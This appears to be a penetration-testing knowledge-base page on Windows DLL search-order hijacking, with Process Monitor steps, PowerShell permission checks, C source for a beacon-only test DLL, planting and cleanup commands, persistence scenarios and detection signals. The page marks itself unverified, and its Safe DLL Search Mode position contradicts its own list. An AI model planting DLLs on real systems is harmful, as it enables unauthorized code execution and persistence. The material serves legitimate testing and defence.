---
title: DLL Hijacking — Exploiting Windows DLL Search Order
type: workflow
platforms: [Windows]
languages: [PowerShell, Windows CLI]
tasks: [Assessment]
category: Workflow
security_domain: Endpoint
author: RJGProjectz
date_created: 2026-11-03
last_updated: 2026-11-03
tags: [dll-hijacking, dll-search-order, dll-preloading, dll-injection, T1574, T1574.001, persistence, privilege-escalation, windows-internals, process-monitor, sysmon, malware-analysis, authorized-testing]
aliases: [DLL hijacking, DLL search order hijacking, DLL preloading attack, DLL side-loading, phantom DLL hijacking, vulnerable DLL, DLL planting]
difficulty: advanced
verified: false
---

# DLL Hijacking — Exploiting Windows DLL Search Order
> **Created**: 2026-11-03T00:00:00Z
> **Last Modified**: 2026-11-03T00:00:00Z
> **Author**: RJGProjectz

> [!CAUTION]
> **AUTHORIZED TESTING ONLY — VALIDATE BEFORE EXECUTION**
> DLL hijacking executes arbitrary code inside a running process and can cause application crashes or data loss on a production system.
> 1. Only place test DLLs in paths explicitly covered by your written authorization.
> 2. Confirm the target application is running in a **lab or test environment** before planting any payload.
> 3. Verify the DLL you plant does its one test action (a benign message box or log write) and exits cleanly — do not use live payloads on scoped test systems.
> 4. Remove all planted DLLs at the end of the test (→ [Covering Tracks](covering-tracks.md)).

!!! danger "VERIFY BEFORE PRODUCTION USE"
    Steps reference documented Windows behavior and published tool syntax but have not been lab-executed for this page. Exact search order, folder-permission defaults, and Sysmon event fields vary by Windows version and security configuration — confirm in your own lab environment. Remove this block when `verified: true`.

**Trigger:** you are assessing a Windows target and need to evaluate whether any application or service loads DLLs from a writable, user-controlled path.

**Goal:** identify a DLL that an application attempts to load before finding it in a legitimate location, confirm the directory is writable, and plant a safe test DLL to confirm code execution.

---

## 1. Understand Windows DLL search order

When a Windows application calls `LoadLibrary("example.dll")` without an absolute path, the OS resolves the name by checking a fixed sequence of directories:

```text
1. KnownDLLs registry key  (HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs)
   — DLLs here are never searched by path; loaded directly from the kernel cache.
2. Application directory   (the folder containing the .exe)
3. System directory        (%SYSTEMROOT%\System32\)
4. 16-bit system directory (%SYSTEMROOT%\System\)
5. Windows directory       (%SYSTEMROOT%\)
6. Current working directory
7. PATH environment variable directories (left to right)
```

Safe DLL Search Mode (enabled by default, `HKLM\SYSTEM\...\SafeDllSearchMode=1`) moves the current working directory from position 3 to after the system directories. Even so, the **application directory** is still searched first and is often user-writable when the application is installed in a non-standard location.

Hijacking targets one of two conditions:

- **Missing DLL**: the application attempts to load a DLL that doesn't exist, falling through to a user-writable path.
- **Search order priority**: the DLL exists in a system directory but the application directory is searched first and is writable.

---

## 2. Identify hijackable DLLs with Process Monitor

> [!CAUTION]
> Run Process Monitor in your own authorized lab environment only — it captures all system activity, including sensitive paths and credentials that may appear in process arguments.

Sysinternals Process Monitor reveals every DLL load attempt in real time:

1. Launch Process Monitor as administrator.
2. Set a filter: **Operation** → **is** → `Load Image` **and** **Process Name** → **is** → `target.exe`.
3. Start the target application.
4. Look for `Load Image` entries with **Result = NAME NOT FOUND** — these are DLLs the process searched for but didn't find.
5. Check whether any `NAME NOT FOUND` path points to a directory your test user can write to:

```powershell
# Check if the application directory is writable by the current user
icacls "C:\Program Files\VulnApp\"

# Check if a specific path in the search result is writable
$testPath = "C:\Program Files\VulnApp\missing.dll"
$dir = Split-Path $testPath
$acl = Get-Acl $dir
$acl.Access | Where-Object { $_.IdentityReference -match $env:USERNAME -or $_.IdentityReference -match 'Users' }
```

A result showing `(M)` (Modify) or `(F)` (Full Control) for the current user or the `Users` group means the path is writable.

---

## 3. Craft and plant a test DLL

A safe test DLL for an authorized engagement does exactly one thing: writes a beacon file to a known location to prove execution, then returns without side effects.

```c
/* Minimal DLL — proof-of-execution beacon only
   Compile:  x86_64-w64-mingw32-gcc -shared -o test.dll test.c
   Or on Windows with MSVC: cl /LD test.c /Fe:test.dll
*/
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        /* Write a beacon file — proves code ran; contains no payload */
        HANDLE f = CreateFileA("C:\\Temp\\dll_hijack_beacon.txt",
            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (f != INVALID_HANDLE_VALUE) {
            const char *msg = "DLL hijack test executed\n";
            DWORD written;
            WriteFile(f, msg, (DWORD)strlen(msg), &written, NULL);
            CloseHandle(f);
        }
    }
    return TRUE;
}
```

After compiling, rename the output to match the missing DLL name and copy it to the writable directory:

```powershell
# Example: Bginfo.exe attempts to load Riched32.dll from its directory
Rename-Item -Path ".\test.dll" -NewName "Riched32.dll"
Copy-Item -Path ".\Riched32.dll" -Destination "C:\Users\Public\Desktop\"

# Launch the target application — if the DLL loads, the beacon file appears
& "C:\Users\Public\Desktop\Bginfo.exe"

# Confirm code execution
Test-Path "C:\Temp\dll_hijack_beacon.txt"
```

---

## 4. DLL hijacking for persistence

Threat actors use DLL hijacking not just for initial code execution but for persistent execution — every time the legitimate application starts, the malicious DLL runs. Common persistence scenarios include:

- **Autorun applications**: applications in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` that load DLLs from user-writable paths.
- **Service binaries**: services that run at startup and load DLLs from their install directory, which is sometimes writable.
- **DLL Search Order Hijacking for Winlogon helpers**: advanced persistence targeting the `Winlogon` notification packages registry key (requires SYSTEM privileges to write, but the DLL path can point to a writable location).

The Turla APT group and several ransomware families have used DLL search order hijacking as a persistence mechanism because it executes inside a legitimate, signed process and bypasses application allowlisting controls that don't check DLL signatures.

---

## 5. Cleanup after testing

Remove all planted test DLLs from the target system:

```powershell
# Remove the test DLL
Remove-Item -Path "C:\Users\Public\Desktop\Riched32.dll" -Force

# Remove the beacon file
Remove-Item -Path "C:\Temp\dll_hijack_beacon.txt" -Force -ErrorAction SilentlyContinue
```

→ [Covering Tracks — full cleanup workflow](covering-tracks.md)

---

## See it

| Source | What you see |
| :--- | :--- |
| **Sysmon Event ID 7** (Image Loaded) | DLL loaded from an unexpected path (e.g., `C:\Users\Public\` instead of `C:\Windows\System32\`) |
| **Windows Defender** | Alert on DLL load from a non-system path by a trusted process |
| **Process Monitor** | `Load Image` for a DLL path in a user-writable directory |
| **Event ID 4688** (Process Creation) | Child process spawned from a DLL that should not have code execution |
| **Application logs** | Unexpected load errors or crashes if the hijacked DLL is missing an expected export |

The clearest detection signal is a Sysmon Event ID 7 (Image Loaded) where the `ImageLoaded` path is in `%USERPROFILE%`, `%TEMP%`, `C:\Users\Public`, or any non-standard application directory for a known-good process.

---

## Detect it

- Detection: [Sigma — Defense Evasion](../../detection/sigma/index.md)
- Detection: [SPL — Windows Events](../../detection/spl/windows-events.md)
- Hunt: [Threat Hunting](../../tasks/threat-hunting/index.md)
- Respond: [Incident Response](../../tasks/incident-response/index.md)
- Harden: [Hardening](../../tasks/hardening/index.md)
- Related offensive: [Windows Host Enumeration & Privilege Escalation](windows-host-enumeration-privesc.md)

## Related concepts

- [Malware Types and Analysis](../fundamentals/concepts/malware-types-analysis.md)
- [Covering Tracks](covering-tracks.md)
- [Boot and Startup Sequence](../fundamentals/concepts/boot-startup-sequence.md)

## External Resources

- [MITRE ATT&CK T1574.001 — DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001/)
- [MITRE ATT&CK T1574.002 — DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)
- [Microsoft — Dynamic-Link Library Search Order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [Sysinternals Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
